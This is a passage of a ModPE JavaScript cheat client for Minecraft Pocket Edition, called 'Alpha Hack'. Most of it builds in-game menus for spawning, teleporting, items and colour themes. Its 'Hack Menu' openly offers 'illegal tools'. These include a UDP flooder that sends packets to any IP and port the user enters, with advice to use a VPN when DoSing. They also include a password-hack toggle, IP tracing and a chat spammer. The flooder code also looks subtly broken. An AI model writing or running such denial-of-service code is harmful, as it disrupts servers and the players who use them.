            name.setText(name2 + space + version);
            name.setTextColor(GUIName);
            name.setGravity(Gravity.CENTER);
            menuLayout.addView(name);

var maker = new TextView(ctx);
            maker.setTextSize(15);
            maker.setText("Made by" + space + authers + "\n& " + authers2);
            maker.setTextColor(GUIName);
            maker.setGravity(Gravity.CENTER);
            menuLayout.addView(maker);

textview2 = android.widget.TextView(ctx);           
textview2.setTextSize(15);                                                                                  textview2.setTextColor(android.graphics.Color.WHITE);
textview2.setText("Hello, " + Player.getName(Player.getEntity()));
textview2.setGravity(Gravity.CENTER);
menuLayout.addView(textview2);

var btn1 = new android.widget.Button(ctx);
		btn1.setText("Settings");
if(GetLang=="de_DE")btn1.setText("Einstellungen");
if(GetLang=="ko_KR")btn1.setText('설정');

if(GetLang=="es_MX")btn1.setText('Configuración');
//btn1.setTextColor(Color.BLUE);
		btn1.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
lmenu_menu(); 
exitUI.dismiss(); 
menu.dismiss(); 
header.dismiss();
			}
		});
		menuLayout.addView(btn1);

var btn2 = new android.widget.Button(ctx);
btn2.setText("Hack Menu");
if(GetLang=="de_DE")btn2.setText('Hack Menü');
if(GetLang=="ko_KR")btn2.setText('해킹 메뉴');

if(GetLang=="es_MX")btn2.setText('Menú de hacks');
//btn2.setTextColor(Color.BLUE);
		btn2.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
xyz(); 
			}
		});
menuLayout.addView(btn2);

var zz = new android.widget.Button(ctx);
zz.setText("ModPE Menu");
if(GetLang=="de_DE")zz.setText('Modpe Menü');
if(GetLang=="ko_KR")zz.setText('ModPE 메뉴');

if(GetLang=="es_MX")zz.setText('Menú de Modpe');
//zz.setTextColor(Color.BLUE);
		zz.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             zmenu_menu();
             menu.dismiss();
             exitUI.dismiss();
header.dismiss();
			}
		});
		menuLayout.addView(zz);

var btn3 = new android.widget.Button(ctx);
		btn3.setText("Spawn Menu");
if(GetLang=="de_DE")btn3.setText('Spawn Menü');
if(GetLang=="ko_KR")btn3.setText('스폰 메뉴');

if(GetLang=="es_MX")btn3.setText('Menú de spawn');
//btn3.setTextColor(Color.BLUE);
		btn3.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             smenu_menu();
             menu.dismiss();
             exitUI.dismiss();
header.dismiss();
			}
		});
		menuLayout.addView(btn3);

var btn4 = new android.widget.Button(ctx);
		btn4.setText("Effect Menu");
if(GetLang=="de_DE")btn4.setText('Effekt Menü');
if(GetLang=="ko_KR")btn4.setText('효과 메뉴');

if(GetLang=="es_MX")btn4.setText('Menú de efectos');
//btn4.setTextColor(Color.BLUE);
		btn4.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             emenu_menu();
             menu.dismiss();
             exitUI.dismiss();
header.dismiss();
clientMessage("§cMenu doesn't work in servers.");
			}
		});
		menuLayout.addView(btn4);

var btn5 = new android.widget.Button(ctx);
            btn5.setText("Teleport Menu");
if(GetLang=="de_DE")btn5.setText('Teleport Menü');
if(GetLang=="ko_KR")btn5.setText('텔레포트 메뉴');

if(GetLang=="es_MX")btn5.setText('teletransportación');
//btn5.setTextColor(Color.BLUE);
            btn5.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
menu.dismiss();
exitUI.dismiss();
TeleMenu();
header.dismiss();
                }
            }));
            menuLayout.addView(btn5);

var btn6 = new android.widget.Button(ctx);
		btn6.setText("Nuke Menu");
if(GetLang=="de_DE")btn6.setText('Bomben Menü');
if(GetLang=="ko_KR")btn6.setText('핵폭탄 메뉴');

if(GetLang=="es_MX")btn6.setText('Menú de bomba nuclear');
//btn6.setTextColor(Color.BLUE);
		btn6.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             nmenu_menu();
             menu.dismiss();
             exitUI.dismiss();
header.dismiss();
			}
		});
		menuLayout.addView(btn6);

var btn7 = new android.widget.Button(ctx);
            btn7.setText("Give Menu");
if(GetLang=="de_DE")btn7.setText('Item Menü');
if(GetLang=="ko_KR")btn7.setText('아이템 주기 메뉴');

if(GetLang=="es_MX")btn7.setText('Menú de tener');
//btn7.setTextColor(Color.BLUE);
            btn7.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
menu.dismiss();
exitUI.dismiss();
GiveMenu();
header.dismiss();
clientMessage("§cKits doesn't work in servers.");
                }
            }));
            menuLayout.addView(btn7);

var btn8 = new android.widget.Button(ctx);
		btn8.setText("Speed Menu");
if(GetLang=="de_DE")btn8.setText('Speed Menü');
if(GetLang=="ko_KR")btn8.setText('속도 메뉴');

if(GetLang=="es_MX")btn8.setText('Menú de velocidad');
//btn8.setTextColor(Color.BLUE);
		btn8.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             dmenu_menu();
             menu.dismiss();
             exitUI.dismiss();
header.dismiss();
			}
		});
		menuLayout.addView(btn8);

var btn10 = new android.widget.Button(ctx);
            btn10.setText("Experience Menu");
if(GetLang=="de_DE")btn10.setText('XP Menü');
if(GetLang=="ko_KR")btn10.setText('경험치 메뉴');

if(GetLang=="es_MX")btn10.setText('Menú de experiencia');
//btn10.setTextColor(Color.BLUE);
            btn10.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
ExMenu();
menu.dismiss();
exitUI.dismiss();
header.dismiss();
                }
            }));
            menuLayout.addView(btn10);

var btn13 = new android.widget.Button(ctx);
            btn13.setText("Morph Menu");
if(GetLang=="de_DE")btn13.setText('Morph Menü');
if(GetLang=="ko_KR")btn13.setText('변신 메뉴');

if(GetLang=="es_MX")btn13.setText('Menú de Morph');
//btn13.setTextColor(Color.BLUE);
            btn13.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
mMenu();
menu.dismiss();
exitUI.dismiss();
header.dismiss();
clientMessage("§cMenu doesn't work in servers.");
                }
            }));
            menuLayout.addView(btn13);

var btn11 = new android.widget.Button(ctx);
            btn11.setText("Weather Menu");
if(GetLang=="de_DE")btn11.setText('Wetter Menü');
if(GetLang=="ko_KR")btn11.setText('날씨 메뉴');

if(GetLang=="es_MX")btn11.setText('Menú de clima');
//btn11.setTextColor(Color.BLUE);
            btn11.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
WaMenu();
menu.dismiss();
exitUI.dismiss();
header.dismiss();
                }
            }));
            menuLayout.addView(btn11);

var btn12 = new android.widget.Button(ctx);
		btn12.setText("Time Menu");
if(GetLang=="de_DE")btn12.setText('Zeit Menü');
if(GetLang=="ko_KR")btn12.setText('시간 메뉴');

if(GetLang=="es_MX")btn12.setText('Menú de tiempo');
//btn12.setTextColor(Color.BLUE);
		btn12.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             amenu_menu();
             menu.dismiss();
             exitUI.dismiss();
header.dismiss();
			}
		});
		menuLayout.addView(btn12);

var source = new Button(ctx);
            source.setText("Mod Community");
if(GetLang=="de_DE")source.setText('Mod Gruppe');
if(GetLang=="ko_KR")source.setText('모드 커뮤니티');

if(GetLang=="es_MX")source.setText('Comunidad de mods');
//source.setTextColor(Color.BLUE);
            source.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
arceusMatt(); 
showMenuBtn();
print("Loading web page");
                }
            }));
            menuLayout.addView(source);

function arceusMatt()
      {
      ctx.runOnUiThread(new java.lang.Runnable({run: function(){
      var webs = new android.webkit.WebView(ctx);
      var webset = webs.getSettings();
      webset.setJavaScriptEnabled(true);
      webs.setWebChromeClient(new android.webkit.WebChromeClient());
      webs.setWebViewClient(new android.webkit.WebViewClient());
      webs.loadUrl('https://plus.google.com/communities/103695355587842948163');
/*Site URL*/
      new android.app.AlertDialog.Builder(ctx).setView(webs).show();
      }}));
      }

menu = new PopupWindow(menuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/3, ctx.getWindowManager().getDefaultDisplay().getHeight());
            menu.setBackgroundDrawable(new ColorDrawable(GUIColor));
            menu.showAtLocation(ctx.getWindow().getDecorView(), Gravity.CENTER | Gravity.TOP, 0, 0);
            }catch(error){
                Toast.makeText(ctx, "An error occured: " + error, 1).show();
            }
    }}));
}

function lmenu_menu(){
ctx.runOnUiThread(new Runnable({ run: function(){
        try{
            var lmenuLayout = new LinearLayout(ctx);
            var lmenuScroll = new ScrollView(ctx);
            var lmenuLayout1 = new LinearLayout(ctx);
            lmenuLayout.setOrientation(1);
            lmenuLayout1.setOrientation(1);
            lmenuScroll.addView(lmenuLayout);
            lmenuLayout1.addView(lmenuScroll);

var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
		MainTitle.setText("Alphα Hαck" + space + version);
       MainTitle.setTextColor(GUIName);
		MainTitle.setTextSize(20);
		lmenuLayout.addView(MainTitle);

var credit2 = new android.widget.TextView(ctx); credit2.setGravity(android.view.Gravity.CENTER);
		credit2.setText("Made by: Arceus_matt");
       credit2.setTextColor(GUIName);
		credit2.setTextSize(20);
		lmenuLayout.addView(credit2);
            
            var title = new android.widget.TextView(ctx); title.setGravity(android.view.Gravity.CENTER);
		title.setText("Special thanks to:");
       title.setTextColor(GUIName);
		title.setTextSize(20);
		lmenuLayout.addView(title);

 var credit1 = new android.widget.TextView(ctx); credit1.setGravity(android.view.Gravity.CENTER);
	 credit1.setText("Godsoft029 for code!");
       credit1.setTextColor(GUIName);
		credit1.setTextSize(20);
		lmenuLayout.addView(credit1);

var exit = new android.widget.Button(ctx);
		exit.setText("Exit");
		exit.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             lmenu.dismiss();
showMenuBtn();
			}
		});
		lmenuLayout.addView(exit);

var pa = new android.widget.Button(ctx);
		pa.setText("Restart script");
		pa.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){ 
 net.zhuoweizhang.mcpelauncher.ScriptManager.setEnabled(modpeFile, true);

net.zhuoweizhang.mcpelauncher.ScriptManager.setEnabled(modpeFile, false);
			}
		});
		lmenuLayout.addView(pa);

var up = new android.widget.Button(ctx);
		up.setText("Check for update");
		up.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){ 
checkVersion(); 
			}
		});
		lmenuLayout.addView(up);

var wb = new android.widget.Button(ctx);
		wb.setText("Web browser");
		wb.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
lmenu.dismiss();
             wb1();
			}
		});
		lmenuLayout.addView(wb);

function wb1() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var wb2 = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter website");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(wb2);
Layer.addView(Exit);

wb2.setText("");
wb2.setHint("https://www.example.com");
Exit.setText("Go to site");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
wb3 =wb2.getText();
Dialog.dismiss();
wb4();
print("Loading web page");
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The wb Dialog Is Malfunctioning:"+e);
}
}});
}

      function wb4()
      {
      ctx.runOnUiThread(new java.lang.Runnable({run: function(){
      var webs = new android.webkit.WebView(ctx);
      var webset = webs.getSettings();
      webset.setJavaScriptEnabled(true);
      webs.setWebChromeClient(new android.webkit.WebChromeClient());
      webs.setWebViewClient(new android.webkit.WebViewClient());
      webs.loadUrl('' + wb3);
/*Site URL*/
      new android.app.AlertDialog.Builder(ctx).setView(webs).show();
      }}));
      }

var l1 = new Button(ctx);
            l1.setText("Transparent Menu");       
            l1.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
GUIColor = GUIColor1
var GUIName = Color.WHITE;
                }
            }));
            lmenuLayout.addView(l1);
            
            var l2 = new Button(ctx);
            l2.setText("Black Menu");       
            l2.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
GUIColor = GUIColor2
 var GUIName = Color.BLACK;
                }
            }));
            lmenuLayout.addView(l2);

var l3 = new Button(ctx);
            l3.setText("White Menu");       
            l3.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
GUIColor = GUIColor3
var GUIName = Color.BLACK
                }
            }));
            lmenuLayout.addView(l3);

var l4 = new Button(ctx);
            l4.setText("Red Menu");       
            l4.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
GUIColor = GUIColor4
                }
            }));
            lmenuLayout.addView(l4);

var l5 = new Button(ctx);
            l5.setText("Blue Menu");       
            l5.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
GUIColor = GUIColor5
                }
            }));
            lmenuLayout.addView(l5);

var l6 = new Button(ctx);
            l6.setText("Gray Menu");       
            l6.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
GUIColor = GUIColor6
var GUIName = Color.WHITE;
                }
            }));
            lmenuLayout.addView(l6);

var l7 = new Button(ctx);
            l7.setText("Light gray Menu");       
            l7.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
GUIColor = GUIColor7
var GUIName = Color.BLACK;
                }
            }));
            lmenuLayout.addView(l7);

var l8 = new Button(ctx);
            l8.setText("Yellow Menu");       
            l8.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
GUIColor = GUIColor8
var GUIName = Color.BLACK;
                }
            }));
            lmenuLayout.addView(l8);

var l9 = new Button(ctx);
            l9.setText("Cyan Menu");       
            l9.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
GUIColor = GUIColor9
var GUIName = Color.BLACK;
                }
            }));
            lmenuLayout.addView(l9);

var l10 = new Button(ctx);
            l10.setText("Dark gray Menu");       
            l10.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
GUIColor = GUIColor10
var GUIName = Color.WHITE
                }
            }));
            lmenuLayout.addView(l10);

var l11 = new Button(ctx);
            l11.setText("Green Menu");       
            l11.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
GUIColor = GUIColor11
                }
            }));
            lmenuLayout.addView(l11);

var l12 = new Button(ctx);
            l12.setText("Magenta Menu");       
            l12.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
GUIColor = GUIColor12
                }
            }));
            lmenuLayout.addView(l12);
		
		var exit2 = new android.widget.Button(ctx);
		exit2.setText("Exit");
		exit2.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             lmenu.dismiss();
showMenuBtn();
			}
		});
		lmenuLayout.addView(exit2);

            lmenu = new PopupWindow(lmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/3, ctx.getWindowManager().getDefaultDisplay().getHeight());
            lmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
            lmenu.showAtLocation(ctx.getWindow().getDecorView(), Gravity.CENTER | Gravity.TOP, 0, 0);
            }catch(error){
                Toast.makeText(ctx, "An error occured: " + error, 1).show();
            }
    }}));
}

function headerView(){
ctx.runOnUiThread(new Runnable({ run: function(){
        try{
            var headerLayout = new LinearLayout(ctx);
            var headerScroll = new ScrollView(ctx);
            var headerLayout1 = new LinearLayout(ctx);
            headerLayout.setOrientation(1);
            headerLayout1.setOrientation(1);
            headerScroll.addView(headerLayout);
            headerLayout1.addView(headerScroll);

            var name = new TextView(ctx);
            name.setTextSize(20);
            name.setText(name2 + space + version);
            name.setTextColor(GUIName);
            name.setGravity(Gravity.CENTER);
            headerLayout.addView(name);

var maker = new TextView(ctx);
            maker.setTextSize(15);
            maker.setText("Made by" + space + authers + "\n& " + authers2);
            maker.setTextColor(GUIName);
            maker.setGravity(Gravity.CENTER);
            headerLayout.addView(maker);

textview2 = android.widget.TextView(ctx);           
textview2.setTextSize(15);                                                                                  textview2.setTextColor(android.graphics.Color.WHITE);
textview2.setText("Hello, " + Player.getName(Player.getEntity()));
textview2.setGravity(Gravity.CENTER);
headerLayout.addView(textview2);

header = new PopupWindow(headerLayout1, dip2px(160), dip2px(160));

header = new PopupWindow(headerLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/3, ctx.getWindowManager().getDefaultDisplay().getHeight()/4);
header.setBackgroundDrawable(new ColorDrawable(Color.BLACK));
            header.showAtLocation(ctx.getWindow().getDecorView(), Gravity.CENTER | Gravity.TOP, 0, 0);
            }catch(error){
                Toast.makeText(ctx, "An error occured: " + error, 1).show();
            }
    }}));
}

function exit(){
    ctx.runOnUiThread(new Runnable({ run: function(){
        try{
            var xLayout = new LinearLayout(ctx);
            var xButton = new Button(ctx);
            xButton.setText('X');
            xButton.setTextColor(Color.RED);
            xButton.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    exitUI.dismiss();
                    menu.dismiss();
header.dismiss(); 
print("Closed successfully");
showMenuBtn();
                }
            }));
            xLayout.addView(xButton);
 
            exitUI = new PopupWindow(xLayout, dip2px(45), dip2px(45));
            exitUI.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
            exitUI.showAtLocation(ctx.getWindow().getDecorView(), Gravity.CENTER | Gravity.TOP, 195, 0);
            }catch(exception){
                Toast.makeText(ctx, exception, 1).show();
            }
    }}));
}

function cmenu_menu(){
ctx.runOnUiThread(new Runnable({ run: function(){
        try{
            var cmenuLayout = new LinearLayout(ctx);
            var cmenuScroll = new ScrollView(ctx);
            var cmenuLayout1 = new LinearLayout(ctx);
            cmenuLayout.setOrientation(1);
            cmenuLayout1.setOrientation(1);
            cmenuScroll.addView(cmenuLayout);
            cmenuLayout1.addView(cmenuScroll);
            
var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
		MainTitle.setText(name + space + version);
       MainTitle.setTextColor(GUIName);
		MainTitle.setTextSize(20);
		cmenuLayout.addView(MainTitle);

            var q2title = new android.widget.TextView(ctx); q2title.setGravity(android.view.Gravity.CENTER);
		q2title.setText("Hack Menu");
       q2title.setTextColor(GUIName);
		q2title.setTextSize(20);
		cmenuLayout.addView(q2title);

var q3title = new android.widget.TextView(ctx);
q3title.setGravity(android.view.Gravity.CENTER);
q3title.setText("Use At Your Own Risk!\nThis menu has illegal tools! Use vpn when DoSing!\n");
q3title.setTextColor(Color.RED);
q3title.setTextSize(25);
cmenuLayout.addView(q3title);

var exitb = new android.widget.Button(ctx);
		exitb.setText("Exit");
		exitb.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             cmenu.dismiss();
showMenuBtn();
			}
		});
		cmenuLayout.addView(exitb);

var dd1 = new android.widget.Button(ctx);
           dd1.setText("DoS UDP");
           dd1.setOnClickListener(new android.view.View.OnClickListener({
               onClick: function(viewarg){
cmenu.dismiss();
dd();
               }
           }));
           cmenuLayout.addView(dd1);

function dd() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var k1 = new android.widget.EditText(ctx);
var k2 = new android.widget.EditText(ctx);
var k3 = new android.widget.EditText(ctx);
//var k4 = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter IP, Port, Packet.");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(k1);
Layer.addView(k2);
Layer.addView(k3);
//Layer.addView(k4);
Layer.addView(Exit);

k1.setText("");
k1.setHint("IP");
k2.setText("");
k2.setHint("Port");
k3.setText("");
k3.setHint("Number of packets");
//k4.setText("");
//k4.setHint("Number of times");
Exit.setText("DIE MOTHER FUCKA");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
ip =k1.getText();
port =k2.getText();
howmuch =k3.getText();
//times =k4.getText();
Dialog.dismiss();
ddos();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The DoS UDP Dialog Is Malfunctioning:"+e);
}
}});
}

function ddos(ip, port, howmuch){
var r = new java.lang.Runnable({
       run: function() {
           

try{
for(var i = 0;i<=howmuch;i++){
var socket = new java.net.DatagramSocket();
var buf = new byte[2024];
buf = "".toString().getBytes("UTF8");
socket.send(new java.net.DatagramPacket(buf, buf.length, java.net.InetAddress.getByName(ip), port));
socket.close();
}
		}catch(e){
			print(e);
		}}});
var t = new java.lang.Thread(r);
t.start();
}

var hackpass = new android.widget.Button(ctx);
            hackpass.setText("Hack password: "+(hackk?"on":"off"));
            hackpass.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
                hackk?hackk=false:hackk=true;
hackpass.setText("Hack password: "+(hackk?"on":"off"));
                }
            }));
            cmenuLayout.addView(hackpass);

var leet = new android.widget.Button(ctx);
            leet.setText("LEET.cc hack");
            leet.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
cmenu.dismiss();
ids();
                }
            }));
            cmenuLayout.addView(leet);

function ids() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var ID = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter support ID");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(ID);
Layer.addView(Exit);

ID.setText("");
ID.setHint("Support ID");
Exit.setText("GET info");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
end =ID.getText();
Dialog.dismiss();
pee();
print("Loading web page");
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The LEET Dialog Is Malfunctioning:"+e);
}
}});
}

      function pee()
      {
      ctx.runOnUiThread(new java.lang.Runnable({run: function(){
      var webs = new android.webkit.WebView(ctx);
      var webset = webs.getSettings();
      webset.setJavaScriptEnabled(true);
      webs.setWebChromeClient(new android.webkit.WebChromeClient());
      webs.setWebViewClient(new android.webkit.WebViewClient());
      webs.loadUrl('https://leet.cc/serverNew.php?serverID=' + end);
/*Site URL*/
      new android.app.AlertDialog.Builder(ctx).setView(webs).show();
      }}));
      }

var svr = new android.widget.Button(ctx);
            svr.setText("Server IP & Port");
            svr.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
clientMessage("§lIP:§r " + Server.getAddress() + " §lPort:§r " + Server.getPort());
                }
            }));
            cmenuLayout.addView(svr);

var yrip = new android.widget.Button(ctx);
            yrip.setText("What's my IP?");
            yrip.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
getIp(function(info){clientMessage("External IP: " + info[0] + "\nCountry: "+info[1]+ "\nRegion: "+info[2])})
getIp(function(info){print("IP: " + info[0])})
                }
            }));
            cmenuLayout.addView(yrip);

var ip0 = new android.widget.Button(ctx);
            ip0.setText("IP lookup");
            ip0.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
cmenu.dismiss();
iplu();
                }
            }));
            cmenuLayout.addView(ip0);

function iplu() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var ip1 = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter IP to trace");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(ip1);
Layer.addView(Exit);

ip1.setText("");
ip1.setHint("IP address");
Exit.setText("Trace");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
ip =ip1.getText();
Dialog.dismiss();
ip2();
print("Loading web page");
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The IPLU Dialog Is Malfunctioning:"+e);
}
}});
}

      function ip2()
      {
      ctx.runOnUiThread(new java.lang.Runnable({run: function(){
      var webs = new android.webkit.WebView(ctx);
      var webset = webs.getSettings();
      webset.setJavaScriptEnabled(true);
      webs.setWebChromeClient(new android.webkit.WebChromeClient());
      webs.setWebViewClient(new android.webkit.WebViewClient());
      webs.loadUrl('http://ip-api.com/json/' + ip);
/*Site URL*/
      new android.app.AlertDialog.Builder(ctx).setView(webs).show();
      }}));
      }

var sit = new android.widget.Button(ctx);
		sit.setText("Image lookup");
		sit.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
web3(); 
print("Loading web page");
			}
		});
		cmenuLayout.addView(sit);

      function web3()
      {
      ctx.runOnUiThread(new java.lang.Runnable({run: function(){
      var webs = new android.webkit.WebView(ctx);
      var webset = webs.getSettings();
      webset.setJavaScriptEnabled(true);
      webs.setWebChromeClient(new android.webkit.WebChromeClient());
      webs.setWebViewClient(new android.webkit.WebViewClient());
      webs.loadUrl('http://www.tineye.com');
/*Site URL*/
      new android.app.AlertDialog.Builder(ctx).setView(webs).show();
      }}));
      }

var sid = new android.widget.Button(ctx);
		sid.setText("View website code");
		sid.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
cmenu.dismiss();
             scc();
			}
		});
		cmenuLayout.addView(sid);

function scc() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sc1 = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter website");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sc1);
Layer.addView(Exit);

sc1.setText("");
sc1.setHint("www.example.com");
Exit.setText("View code");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
sc2 =sc1.getText();
Dialog.dismiss();
sc3();
print("Loading web page");
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The scc Dialog Is Malfunctioning:"+e);
}
}});
}

      function sc3()
      {
      ctx.runOnUiThread(new java.lang.Runnable({run: function(){
      var webs = new android.webkit.WebView(ctx);
      var webset = webs.getSettings();
      webset.setJavaScriptEnabled(true);
      webs.setWebChromeClient(new android.webkit.WebChromeClient());
      webs.setWebViewClient(new android.webkit.WebViewClient());
      webs.loadUrl('http://www.iwebtool.com/code_viewer?domain=' + sc2);
/*Site URL*/
      new android.app.AlertDialog.Builder(ctx).setView(webs).show();
      }}));
      }

		var exitb2 = new android.widget.Button(ctx);
		exitb2.setText("Exit");
	   exitb2.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             cmenu.dismiss();
showMenuBtn();
			}
		});
		cmenuLayout.addView(exitb2);

            cmenu = new PopupWindow(cmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/3, ctx.getWindowManager().getDefaultDisplay().getHeight());
            cmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
            cmenu.showAtLocation(ctx.getWindow().getDecorView(), Gravity.CENTER | Gravity.TOP, 0, 0);
            }catch(error){
                Toast.makeText(ctx, "An error occured: " + error, 1).show();
            }
    }}));
}

function zmenu_menu(){
ctx.runOnUiThread(new Runnable({ run: function(){
        try{
            var zmenuLayout = new LinearLayout(ctx);
            var zmenuScroll = new ScrollView(ctx);
            var zmenuLayout1 = new LinearLayout(ctx);
            zmenuLayout.setOrientation(1);
            zmenuLayout1.setOrientation(1);
            zmenuScroll.addView(zmenuLayout);
            zmenuLayout1.addView(zmenuScroll);

var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
		MainTitle.setText(name + space + version);
       MainTitle.setTextColor(GUIName);
		MainTitle.setTextSize(20);
		zmenuLayout.addView(MainTitle);
            
            var T_title = new android.widget.TextView(ctx); T_title.setGravity(android.view.Gravity.CENTER);
		T_title.setText("ModPE Menu");
       T_title.setTextColor(GUIName);
		T_title.setTextSize(20);
		zmenuLayout.addView(T_title);

var A_exit = new android.widget.Button(ctx);
		A_exit.setText("Exit");
		A_exit.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             zmenu.dismiss();
showMenuBtn();
			}
		});
		zmenuLayout.addView(A_exit);

var spam = new Button(ctx);
            spam.setText("Spammer: "+(sspam?"on":"off"));        
            spam.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){ 
spa()

                }
            }));
            zmenuLayout.addView(spam);

function spa() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var mm = new android.widget.EditText(ctx);
